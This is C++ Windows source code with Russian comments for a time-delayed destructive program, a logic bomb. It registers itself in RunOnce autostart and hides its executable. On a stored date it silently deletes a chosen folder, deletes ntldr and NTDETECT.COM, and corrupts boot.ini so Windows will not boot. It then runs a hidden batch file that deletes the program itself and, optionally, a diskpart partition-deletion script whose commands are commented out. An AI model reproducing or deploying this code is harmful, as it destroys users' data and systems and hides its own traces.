#include "stdafx.h"
#include "DeleteDay.h"

#include <string>
using namespace std;


CDeleteDay::CDeleteDay()
{
}

CDeleteDay::~CDeleteDay()
{
}

// //добавляем себя автозагрузку
bool CDeleteDay::AddToAutoRun()
{
	CString csExePath;
	DWORD dwSize = 512;
	GetModuleFileName(NULL, csExePath.GetBuffer(dwSize), dwSize);
	TRACE1("Путь к программе = %s\n", csExePath.GetString());

	csExePath.ReleaseBuffer();

	//добавить себя в автозагрузку
	//наверное правильней будет добавлять в RunOnce и каждый раз себя туда добавлять если не
	//достигнута дата срабатывания
	if (SHSetValue(HKEY_CURRENT_USER
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, stringSizeInBytes(csExePath)) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в AddToAutorun()");
		return false;
	}

	return true;
}

// записываем в реестр когда выполнится задача
bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
{
	CString DeleteDay, DeleteWeek, DeleteMonth;

	DeleteDay.Format(L"%d", SysTime.wDay);
	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
	DeleteMonth.Format(L"%d", SysTime.wMonth);

	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
	TRACE1("День удаления = %s\n", DeleteDay.GetString());

	HKEY hk;

	// создать ключ в HKCR\CLSID
	if (RegCreateKeyEx(HKEY_CURRENT_USER
		, RegDataKeyName
		, 0
		, NULL
		, REG_OPTION_NON_VOLATILE
		, KEY_WRITE
		, NULL
		, &hk
		, NULL))
	{
		TRACE(L"Could not create the registry key in SaveDeleteDay().", L"Облом", MB_ICONERROR);
		return false;
	}

	RegCloseKey(hk);

	//===== сохраним день удаления ======
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayKeyName			//имя значения
		, REG_SZ
		, DeleteDay.GetString()
		, stringSizeInBytes(DeleteDay)) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	//===== сохраним день недели =====
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayOfWeekKeyName			//имя значения
		, REG_SZ
		, DeleteWeek.GetString()
		, stringSizeInBytes(DeleteWeek)) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	//===== сохраним месяц =====
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelMonthKeyName			//имя значения
		, REG_SZ
		, DeleteMonth.GetString()
		, stringSizeInBytes(DeleteMonth)) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()");
		return false;
	}

	return true;
}

// записываем какую папку будем удалять
bool CDeleteDay::SavePathOfFolderToDelete(CString csFolderPath)
{
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelFolderKeyName
		, REG_SZ
		, csFolderPath.GetString()
		, stringSizeInBytes(csFolderPath)) != ERROR_SUCCESS)
	{
		TRACE(L"Облом с SHSetValue() в SaveFolderPathToDelete()");
		return false;
	}

	return true;
}

void CDeleteDay::HideFile(bool bHide)
{
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	wchar_t sz[600] = { L"\0" }; // Строка-помошник...

	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику

	//Retrieves the short path form of the specified path.
	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем имя файла в досовский вид
		wcscpy(szFileExe, sz);

	if (bHide) {
		SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл
	}
	else {
		SetFileAttributes(szFileExe, FILE_ATTRIBUTE_NORMAL); // показываем файл
	}
	
}

bool CDeleteDay::EnableCrashOnCtrlScroll()
{
	HKEY hKey;

	if (RegOpenKey(HKEY_CURRENT_USER, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
	{
		DWORD lpData = 0x01;

		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof(lpData)) != ERROR_SUCCESS)
		{
			TRACE(L"Облом с SHSetValue() в EnableCrashOnCtrlScroll()");
			return false;
		}
	}

	return true;
}

bool CDeleteDay::DeleteDiskD(void)
{
	CString csDeleteD("YES");

	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDiskDKeyName
		, REG_SZ
		, csDeleteD.GetString()
		, csDeleteD.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в DeleteDiskD()");
		return false;
	}

	return true;
}

bool CDeleteDay::SaveTaskKillWindows()
{
	CString csKillWindows("YES");

	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, KillWindowsKeyName
		, REG_SZ
		, csKillWindows.GetString()
		, csKillWindows.GetLength()) != ERROR_SUCCESS)
	{
		TRACE(L"Облом с SHSetValue() в DeleteDiskD()\n");
		return false;
	}

	return true;
}

void CDeleteDay::SelfDelete()
{
	//удалить себя из автозагрузки
	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	// Далее выделяем много памяти - лишним не будет %)
	char szFilePath[MAX_PATH] = { "\0" };
	char szFileBat[MAX_PATH] = { "System.bat" };
	char szFileExe[MAX_PATH] = { "\0" };

	char sz[600]; // Строка-помошник...

	unsigned int iTmp;
	char* lpTmp;

	// Получаем путь к запущенному ехешнику
	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe));

	// Преобразуем в имя файла в досовский вид
	if (GetShortPathNameA(szFileExe, sz, MAX_PATH))
		strcpy(szFileExe, sz);

	size_t sLen = strlen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки

	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
	{
		if (!strncmp(lpTmp, "\\", 1))
			break;
	}

	//убираем из пути к фалу название программы
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	strncpy(szFilePath, szFileExe, count);
	strcat(szFilePath, "\\");

	//===== удалить саму себя =====
	char BATSTRING[1024] =
		":Repeat\n"
		"del \"%s\"\n" //команда на удаление экзешника
		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		":Repeat1\n"
		"del \"%s\"\n"
		"\0"; //удаление батника

	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile)	{
		TRACE(L"Факн щет, файла System.bat нет и не будет\n");
	}

	//char sz[600]; // Строка-помошник...
	//создаем бат-файл ===========================================
	sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

	if (bError)	{
		TRACE(L"Факн щет, текст в файл System.bat не удалось записать\n");
	}

	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени

	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
}

// Проверить не наступил ли день выполнения задания
bool CDeleteDay::InspectDeleteData()
{
	CString DeleteDay, CurrentDay;
	
	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
	
	//получить дату удаления, если данные получить не удалось
	if (!ReadRegDeleteDay(DelDay, DelDayOfWeek, DelMonth)) {
		//то наверное програ запускается первый раз и читать пока нечего
		return false;
	}
	
	//определить текущую дату
	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);
	
	//сравнить даты, если совпадают, то ...
	//нужно сравнивать день, день недели и месяц по отдельности
	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 )	{	
		if (CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth) {
			TRACE0("Даты совпадают. Выполняем устаноленное задание.\n");
			return true;
		}		
	}	
	return false;
}

bool CDeleteDay::PerformATask(void)
{
	const int SIZE = 1024;
	// Далее выделяем много памяти - лишним не будет %)
	char szFilePath[SIZE] = { "\0" };
	char szFileBat[SIZE] = { "\0" };
	char szFileExe[SIZE] = { "\0" };
	char szFileDiskPart[SIZE] = { "\0" };
	char szTempPath[SIZE] = { "\0" };

	char buffer[SIZE] = { "\0" }; // Строка-помошник...

	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику

	if (GetShortPathNameA(szFileExe, buffer, SIZE)) // Преобразуем в имя файла в досовский вид
		strncpy(szFileExe, buffer, sizeof(szFileExe));

	//убираем название проги и расширение. Перемещаем указатель
	unsigned int iTmp;
	char* lpTmp;
	size_t sLen = strlen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки

	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
	{
		if (!strncmp(lpTmp, "\\", 1))
			break;
	}

	//убираем из пути к фалу название программы
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	strncpy(szFilePath, szFileExe, count);
	strcat(szFilePath, "\\");

	GetTempPathA(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке

	//если удалить диск Д
	if (IfDeleteDiskD()) {
		CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
	}

	if (IfKillWindows()) {
		//делаем загрузку винды невозможной
		DoKillWindows();
	}

	//удаляем выбранную папку
	DeleteFolder();
	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// Делаем файл нормальным иначе не удаляется 
	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
	//удаляем из автозагрузки
	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	return false; // И закрываемся
}

bool DeleteFolder()
{
	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	wstring csPath;

	typedef wstring::size_type strLength;

	CString cspvData;

	SHGetValue(HKEY_CURRENT_USER, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);

	csPath = cspvData;

	strLength iLength = csPath.length();
	strLength index = 0;

	/*формируем строку вида С:\\Новая папка\\ вместо С:\Новая папка\*/
	for (;;)
	{
		index = csPath.find(L"\\", index);

		if (index == -1)
			break;

		csPath.insert(index, L"\\");

		index += 2;
	}

	csPath = csPath + L'\0' + L'\0';

	SHFILEOPSTRUCT sh;
	sh.hwnd = NULL;
	sh.wFunc = FO_DELETE;
	sh.pFrom = csPath.c_str();
	sh.pTo = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;

	if (SHFileOperation(&sh) != 0)
	{
		TRACE1("Папка \"%s\" НЕ удалена.\n", csPath.c_str());
		return false;
	}

	return true;
}

bool IfDeleteDiskD(void)
{
	CString DelD;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//удалять только папку или диск д тоже
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDiskDKeyName
		, &dwDataType
		, DelD.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");
	}

	if (DelD.Compare(L"YES") == 0)
	{
		DelD.ReleaseBuffer();
		return true;
	}

	return false;
}

bool IfKillWindows()
{
	CString csKillW;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//удалять только папку или диск д тоже
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, KillWindowsKeyName
		, &dwDataType
		, csKillW.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в IfKillWindows().\n");
	}

	if (csKillW.Compare(L"YES") == 0){
		csKillW.ReleaseBuffer();
		return true;
	}

	return false;
}

bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
{
	CString RegStringValue;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//===== получить день удаления папки =====
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня удаления.\n");
		return false;
	}

	//конвертим строку в число
	DelDay = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== получить день недели =====
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayOfWeekKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня недели удаления.\n");
		return false;
	}

	//конвертим строку в число
	DelDayOfWeek = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== получить месяц =====
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelMonthKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении месяца удаления.\n");
		return false;
	}

	//конвертим строку в число
	Month = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	return true;
}

void GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
{
	CString CurrentDay;

	//получить текущую дату
	CTime CurrentTime(CTime::GetCurrentTime());
	SYSTEMTIME timeDest;
	CurrentTime.GetAsSystemTime(timeDest);

	iDay = timeDest.wDay;
	iDayOfWeek = timeDest.wDayOfWeek;
	iMonth = timeDest.wMonth;

	//CurrentDay.Format("%d%d%d", iDay, iDayOfWeek, iMonth);

	return;
}

bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[])
{
	char sz[600]; // Строка-помошник...
					 //создадим или во временной папке или в рабочем каталоге программы
	sprintf(szFileDiskPart, "%sDiskpart.txt", (strlen(szTempPath)) ? szTempPath : szFilePath);

	// Если файл существует, то изменим его аттрибуты на нормальные
	SetFileAttributesA(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); 

	//создаем diskpart сценарий ===========================================
	//const char* DISKPARTSTRING = "select disk 0\nselect partition 3\ndelete partition noerr override";
	const char* DISKPARTSTRING = "пока ничего не делаем";
	//заполняем строку для записи в файл
	//sprintf(sz, DISKPARTSTRING);

	HANDLE hFile = CreateFileA((LPCSTR)DISKPARTSTRING,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile)
	{
		TRACE("Факн щет, файла Diskpart.txt нет и не будет\n");
		return false;
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

	if (bError)
	{
		TRACE("Факн щет, текст в файл Diskpart.txt не удалось записать");
		return false;
	}

	CloseHandle(hFile);

	return true;
}

bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
{
	char strTemp[600] = { '\0' }; // Строка-помошник...
	//создаем бат-файл в папке темп или в папке с программой
	sprintf(szFileBat, "%sSystem.bat", (strlen(szTempPath)) ? szTempPath : szFilePath);

	SetFileAttributesA(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные

	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile) {
		TRACE("Факн щет, файла System.bat нет и не будет");
		return false;
	}

	char BATSTRING[1024] =
		":Repeat\n"
		"del \"%s\"\n" //команда на удаление экзешника
		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		":Repeat1\n"
		"del \"%s\"\n"
		"\0"; //удаление батника	

	if (IfDeleteDiskD()) {
		//формируем команду для записи в файл
		strncpy(BATSTRING,
			":Repeat\n"
			"del \"%s\"\n" //команда на удаление экзешника
			"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
			"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
			":Repeat1\n"
			"del \"%s\"\n" //удаление батника
			"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart

		sprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
	}
	else {
		sprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
	}

	DWORD dwBytesWritten;
	BOOL bError = (!WriteFile(hFile, strTemp, strlen(strTemp), &dwBytesWritten, NULL) || strlen(strTemp) != dwBytesWritten);

	if (bError) {
		TRACE("Факн щет, текст в файл System.bat не удалось записать");
		return false;
	}

	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени

	return true;
}

void DoKillWindows()
{
	const int INFO_BUFFER_SIZE = 100;

	CString SystemDisk;

	//на каком диске стоит винда?
	//GetBuffer() Returns a pointer to the internal character buffer for the CSimpleStringT object
	GetWindowsDirectory(SystemDisk.GetBuffer(INFO_BUFFER_SIZE), INFO_BUFFER_SIZE);

	SystemDisk.ReleaseBuffer();

	//нам нужна только буква диска, обрезаем не нужное
	SystemDisk = SystemDisk.Left(3);
	TRACE("%s\n", SystemDisk);

	//===== 1 удалить ntldr =====
	CString csFileName = SystemDisk + L"\\ntldr";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("Облом! Файл НЕ удален");

	//===== 2 удалить ntdetect.com =====
	csFileName = SystemDisk + L"\\NTDETECT.COM";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("Облом! Файл НЕ удален");

	//===== 3 изменить boot.ini =====
	CFile BootIniFile;

	const int bufSize = 1024;
	char readBuffer[bufSize];

	csFileName = SystemDisk + L"\\boot.ini";

	//--- читаем файл ---
	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeReadWrite))
	{
		TRACE("Не удалось открыть файл");
		return;
	}

	int BytesRead = BootIniFile.Read(readBuffer, sizeof(readBuffer));

	BootIniFile.Close();

	BootIniFile.Remove(csFileName.GetString());

	//--- записываем файл ---
	CString csBootINI(readBuffer);

	csBootINI.Replace(L"partition(1)", L"partition(9)");

	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeWrite | CFile::modeCreate))
	{
		TRACE("Не удалось открыть файл");
		return;
	}

	BootIniFile.Write(csBootINI, BytesRead);

	BootIniFile.Close();

	//делаем как было...
	SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

//возвращает размер строки в байтах
int stringSizeInBytes(CString strToCalc) {
	return sizeof(strToCalc)*strToCalc.GetLength();
}